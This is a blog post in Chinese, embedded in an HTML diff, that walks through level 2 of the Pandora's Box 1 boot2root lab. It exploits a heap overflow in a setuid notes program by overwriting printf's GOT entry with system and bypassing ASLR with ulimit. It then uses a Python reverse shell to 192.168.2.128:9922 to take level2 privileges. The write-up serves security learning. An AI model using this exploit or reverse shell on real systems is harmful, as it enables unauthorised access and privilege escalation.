@@ -1,0 +1,490 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Pandora&#8217;s Box 1 - Level 2 - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="接續上篇Pandora&rsquo;s Box 1 - Level 1 Shell$ ls
+drwxr-x--- 4 level1 level1 4096 Mar 16 12:49 .
+drwxr-xr-x 7 root root 4096 Jan 3 21:56 ..
+-rwsr-xr-x 1 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2015/03/23/pandora1_level2/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Pandora&#8217;s Box 1 - Level 2</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-23T02:00:03+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>2:00 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>接續上篇<a href="../../../03/12/pandora1_level1/">Pandora&rsquo;s Box 1 - Level 1</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<pre><code>Shell$ ls
+drwxr-x--- 4 level1 level1  4096 Mar 16 12:49 .
+drwxr-xr-x 7 root   root    4096 Jan  3 21:56 ..
+-rwsr-xr-x 1 level2 level1  9052 Jan  4 08:58 level2
+-rw-r--r-- 1 level1 level1   145 Jan  4 09:00 level2_readme.txt
+Shell$ cat level2_readme.txt
+Start this level with socat 'socat TCP4-listen:53121,reuseaddr,fork EXEC:./level2' and use netcat or whatever to communicate with it.
+
+Have fun!
+</code></pre>
+
+<p>level2有設sticky bit，看起來要透過它取得level2的權限</p>
+
+<p>提示說要用socat執行level2，不過還是先試試能不能直接執行</p>
+
+<pre><code>level1@pb0x:~$ ./level2
+[*] Notes manager - 1.0
+[*] Type help for the command list
+&gt; help
+Command list:
+        Create new note     : new
+        Set note text       : set
+        Show note text      : show
+        Delete note         : del
+        Show commands       : help
+        Exit                : exit
+&gt;
+</code></pre>
+
+<p>看起來像個筆記本程式，有新增、編輯、顯示、刪除的功能</p>
+
+<p>操作之後會發現在編輯(set)時，輸入過長的字元後，要讀取下一個編號的內容會造成crash</p>
+
+<pre><code>[*] Notes manager - 1.0
+[*] Type help for the command list
+&gt; new
+[*] New note created with id 0
+&gt; new
+[*] New note created with id 1
+&gt; set
+&gt; id: 0
+&gt; text(32 max): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[*] Note 0 set
+&gt; [!] Invalid command, try help
+&gt; &gt; read 1
+[!] Invalid command, try help
+&gt; show
+&gt; id: 1
+Segmentation fault
+</code></pre>
+
+<p>接著進gdb重現一下當機，看看有沒有可以利用的部分</p>
+
+<pre><code>level1@pb0x:~$ gdb -q level2
+Reading symbols from /home/level1/level2...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /home/level1/level2
+[*] Notes manager - 1.0
+[*] Type help for the command list
+&gt; new
+[*] New note created with id 0
+&gt; new
+[*] New note created with id 1
+&gt; set
+&gt; id: 0
+&gt; text(32 max): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                          AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[*] Note 0 set
+&gt; [!] Invalid command, try help
+&gt; show
+&gt; id: 1
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7606e59 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) i r
+eax            0x0      0
+ecx            0xffffffff       -1
+edx            0x0      0
+ebx            0xb7768ff4       -1216966668
+esp            0xbf869770       0xbf869770
+ebp            0xbf869d28       0xbf869d28
+esi            0xb7769a20       -1216964064
+edi            0x41414141       1094795585
+eip            0xb7606e59       0xb7606e59 &lt;vfprintf+9081&gt;
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+</code></pre>
+
+<p>這邊可以看到edi被我們的輸入蓋過去了，繼續分析一下level2</p>
+
+<pre><code>(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048720  frame_dummy
+0x0804874c  show_welcome
+0x08048779  show_help
+0x080487d5  stripnewline
+0x08048821  create_struct
+0x0804887e  free_struct
+0x0804889f  get_empty_slot
+0x080488dd  slot_exists
+</code></pre>
+
+<p>找到了幾個像是自定義的函式，大概看一下之後發現create_struct裡面有呼叫malloc，繼續深入了解一下</p>
+
+<pre><code>(gdb) disas create_struct
+Dump of assembler code for function create_struct:
+   0x08048821 &lt;+0&gt;:     push   %ebp
+   0x08048822 &lt;+1&gt;:     mov    %esp,%ebp
+   0x08048824 &lt;+3&gt;:     sub    $0x28,%esp
+   0x08048827 &lt;+6&gt;:     movl   $0x8,(%esp)
+   0x0804882e &lt;+13&gt;:    call   0x80485e0 &lt;malloc@plt&gt;
+   0x08048833 &lt;+18&gt;:    mov    %eax,-0xc(%ebp)
+   0x08048836 &lt;+21&gt;:    mov    -0xc(%ebp),%eax
+   0x08048839 &lt;+24&gt;:    movl   $0x40,(%eax)
+   0x0804883f &lt;+30&gt;:    mov    -0xc(%ebp),%eax
+   0x08048842 &lt;+33&gt;:    mov    (%eax),%eax
+   0x08048844 &lt;+35&gt;:    mov    %eax,(%esp)
+   0x08048847 &lt;+38&gt;:    call   0x80485e0 &lt;malloc@plt&gt;
+   0x0804884c &lt;+43&gt;:    mov    %eax,%edx
+   0x0804884e &lt;+45&gt;:    mov    -0xc(%ebp),%eax
+   0x08048851 &lt;+48&gt;:    mov    %edx,0x4(%eax)
+   0x08048854 &lt;+51&gt;:    mov    -0xc(%ebp),%eax
+   0x08048857 &lt;+54&gt;:    mov    (%eax),%eax
+   0x08048859 &lt;+56&gt;:    mov    -0xc(%ebp),%edx
+   0x0804885c &lt;+59&gt;:    mov    0x4(%edx),%edx
+   0x0804885f &lt;+62&gt;:    and    $0xfffff000,%edx
+   0x08048865 &lt;+68&gt;:    movl   $0x7,0x8(%esp)
+   0x0804886d &lt;+76&gt;:    mov    %eax,0x4(%esp)
+   0x08048871 &lt;+80&gt;:    mov    %edx,(%esp)
+   0x08048874 &lt;+83&gt;:    call   0x8048570 &lt;mprotect@plt&gt;
+   0x08048879 &lt;+88&gt;:    mov    -0xc(%ebp),%eax
+   0x0804887c &lt;+91&gt;:    leave
+   0x0804887d &lt;+92&gt;:    ret
+End of assembler dump.
+</code></pre>
+
+<p>malloc的部分，看起來是建立了兩個連續的空間</p>
+
+<p>第一次建立的大小是8 bytes，第二次是64 bytes，8 bytes中的4個bytes會用來指向64 bytes的所在位址</p>
+
+<p>最後則是作者佛心來著(?)，用mprotect把64 bytes的區塊設定成可讀可寫可執行的狀態????</p>
+
+<p>接下來驗證一下是不是真的有辦法修改這塊記憶體</p>
+
+<pre><code>(gdb) r
+Starting program: /home/level1/level2
+[*] Notes manager - 1.0
+[*] Type help for the command list
+&gt; new
+[*] New note created with id 0
+&gt; new
+[*] New note created with id 1
+&gt; set
+&gt; id: 0
+&gt; text(32 max): Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+[*] Note 0 set
+&gt; show
+&gt; id: 1
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb75c2e59 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) x $edi
+0x63413563:     Cannot access memory at address 0x63413563
+
+root@kali:~/_Sec/vulnhub/pandora# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x63413563
+[*] Exact match at offset 76
+</code></pre>
+
+<p>用pattern_create.rb和pattern_offset.rb找出長度之後，接著來試試看能不能用set 1去修改set 0時覆蓋過去的記憶體位址</p>
+
+<p>再來要找一個這支程式很常用到的函式，去修改他指向的記憶體位址，等這個函式被調用的時候就會去執行我們指定的程式碼區段</p>
+
+<p>而這可憐的函式就決定是printf了，我們有PLT和GOT兩個入口可以選擇，不過檢查一下會發現PLT的區塊是唯讀的，那就只剩下GOT的printf可以用了</p>
+
+<pre><code>level1@pb0x:~$ objdump -h level2
+ 12 .plt          00000110  08048550  08048550  00000550  2**4
+              CONTENTS, ALLOC, LOAD, READONLY, CODE
+
+level1@pb0x:~$ objdump -R level2
+
+level2:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804a370 R_386_JUMP_SLOT   printf
+</code></pre>
+
+<p>找到GOT的位置後，再來要替換GOT指向的記憶體位址</p>
+
+<p>這邊選擇了system，使用ret2libc的方式，直接呼叫system去執行程式</p>
+
+<p>在替換的過程遇到了點問題，因為ASLR是開著的，所以system的位址每次都會變動</p>
+
+<p>而且level1沒有權限去改/proc/sys/kernel/randomize_va_space的內容</p>
+
+<p>最後靠著google大神找到了一個神奇的解法，在32-bit的機器上只要下一個指令就能暫時無視ASLR了</p>
+
+<pre><code>level1@pb0x:~$ ldd level2
+        linux-gate.so.1 =&gt;  (0xb7795000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75e4000)
+        /lib/ld-linux.so.2 (0xb7796000)
+level1@pb0x:~$ ldd level2
+        linux-gate.so.1 =&gt;  (0xb774d000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb759c000)
+        /lib/ld-linux.so.2 (0xb774e000)
+level1@pb0x:~$ ldd level2
+        linux-gate.so.1 =&gt;  (0xb7724000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7573000)
+        /lib/ld-linux.so.2 (0xb7725000)
+level1@pb0x:~$ ulimit -s 9999999999
+level1@pb0x:~$ ldd level2
+        linux-gate.so.1 =&gt;  (0x40022000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x40029000)
+        /lib/ld-linux.so.2 (0x40000000)
+level1@pb0x:~$ ldd level2
+        linux-gate.so.1 =&gt;  (0x40022000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x40029000)
+        /lib/ld-linux.so.2 (0x40000000)
+</code></pre>
+
+<p>解除ASLR之後，在gdb就能找到system的位址了</p>
+
+<pre><code>(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0x40068460 &lt;system&gt;
+</code></pre>
+
+<p>最後再把完整的exploit拼起來</p>
+
+<pre><code>level1@pb0x:~$ python -c 'print "new\nnew\nset\n0\n"+"A"*76+"\x70\xa3\x04\x08"+"\nset\n1\n"+"\x60\x84\x06\x40"+"\nexit\n"' &gt; input.hack
+level1@pb0x:~$ ./level2 &lt; input.hack
+[*] Notes manager - 1.0
+[*] Type help for the command list
+&gt; [*] New note created with id 0
+&gt; [*] New note created with id 1
+&gt; &gt; id: &gt; text(32 max): [*] Note 0 set
+&gt; &gt; id: &gt; text(32 max): sh: 1: [*]: not found
+&gt; [*] Goodbye
+</code></pre>
+
+<p>看來餵給system的檔名為&#8221;[*]&ldquo;，再來只要建立一個名為[*]檔案，裡面看要怎麼操作都可以</p>
+
+<p>這邊寫一個reverse shell接回Kali Linux。等Kali把listen port架起來後，執行level2就能拿到level2的權限囉</p>
+
+<pre><code>level1@pb0x:~$ cat [*]
+#!/usr/bin/python
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.2.128",9922))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+level1@pb0x:~$ ./level2 &lt; input.hack
+[*] Notes manager - 1.0
+[*] Type help for the command list
+&gt; [*] New note created with id 0
+&gt; [*] New note created with id 1
+&gt; &gt; id: &gt; text(32 max): [*] Note 0 set
+&gt; &gt; id: &gt; text(32 max):
+
+root@kali:~# nc -lvp 9922
+listening on [any] 9922 ...
+192.168.2.158: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.2.128] from (UNKNOWN) [192.168.2.158] 50702
+$ id
+uid=1001(level1) gid=1001(level1) euid=1002(level2) groups=1002(level2),1001(level1)
+$ whoami
+level2
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-03-23T02:00:03+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>2:00 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2015/03/23/pandora1_level2/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2015/03/23/pandora1_level2/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/12/pandora1_level1/" title="Previous Post: Pandora's Box 1 - Level 1">&laquo; Pandora&#8217;s Box 1 - Level 1</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/04/16/rop-primer/" title="Next Post: ROP-Primer Level 0">ROP-Primer Level 0 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>最近文章</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/23/pipe/">/dev/random: Pipe</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/20/sleepy/">/dev/random: Sleepy</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
